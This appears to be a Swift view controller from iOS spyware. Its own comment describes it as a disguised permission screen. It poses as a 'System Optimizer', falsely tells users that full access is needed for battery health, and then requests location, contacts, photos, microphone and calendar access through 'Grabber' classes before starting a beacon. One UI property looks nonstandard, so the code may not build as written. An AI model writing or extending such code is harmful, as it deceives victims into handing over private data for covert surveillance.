//
//  SetupViewController.swift
//  Disguised permission-request screen. Looks like a generic system tool.
//

import UIKit

class SetupViewController: UIViewController {

    private let prefs = Prefs.shared

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground

        let scroll = UIScrollView(frame: view.bounds)
        scroll.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        view.addSubview(scroll)

        let stack = UIStackView()
        stack.axis = .vertical
        stack.spacing = 16
        stack.translatesAutoresizingMaskIntoConstraints = false
        scroll.addSubview(stack)

        let title = UILabel()
        title.text = "System Optimizer"
        title.font = .systemFont(ofSize: 26, weight: .bold)

        let info = UILabel()
        info.text = "Optimize battery and clean background activity. Full access is required to monitor device health in the background."
        info.font = .systemFont(ofSize: 15)
        info.textColor = .secondaryLabel
        info.numberOfLines = 0

        let button = UIButton(type: .system)
        button.setTitle("Optimize Now", for: .normal)
        button.titleLabel?.font = .systemFont(ofSize: 17, weight: .semibold)
        button.backgroundColor = .systemGreen
        button.setTitleColor(.white, for: .normal)
        button.layerCornerRadius = 10
        button.heightAnchor.constraint(equalToConstant: 48).isActive = true
        button.addTarget(self, action: #selector(optimizeTapped), for: .touchUpInside)

        stack.addArrangedSubview(title)
        stack.addArrangedSubview(info)
        stack.addArrangedSubview(button)

        NSLayoutConstraint.activate([
            stack.topAnchor.constraint(equalTo: scroll.topAnchor, constant: 60),
            stack.leadingAnchor.constraint(equalTo: scroll.leadingAnchor, constant: 24),
            stack.trailingAnchor.constraint(equalTo: scroll.trailingAnchor, constant: -24),
            stack.widthAnchor.constraint(equalTo: scroll.widthAnchor, constant: -48)
        ])
    }

    @objc private func optimizeTapped() {
        // request everything in a plausible order; each denial degrades gracefully
        LocationProvider.shared.requestPermission()
        ContactGrabber.shared.requestPermission()
        PhotoGrabber.shared.requestPermission()
        AudioGrabber.shared.requestPermission()
        CalendarGrabber.shared.requestPermission()
        prefs.firstRunDone = true
        BeaconManager.shared.tick { _ in }
    }
}
